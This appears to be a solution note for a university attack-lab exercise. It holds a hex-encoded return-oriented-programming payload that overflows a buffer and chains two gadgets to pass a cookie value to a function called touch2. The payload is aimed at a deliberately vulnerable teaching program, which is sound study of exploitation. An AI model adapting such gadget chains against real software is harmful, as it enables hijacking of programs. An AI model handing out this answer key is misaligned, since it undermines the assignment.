## 整体思路
c2 a9 20 32 30 31 39 20
43 6f 70 79 72 69 67 68
74 20 48 61 6b 75 6c 61
2c 20 43 43 20 42 59 2d
4e 43 2d 53 41 20 00 00             /* 40 bytes of trash            */
cc 19 40 00 00 00 00 00             /* popq   %rax                  */
fa 97 b9 59 00 00 00 00             /* the value of cookie          */
a2 19 40 00 00 00 00 00             /* movq   %rax,%rdi             */
ec 17 40 00 00 00 00 00             /* the address of touch2        */
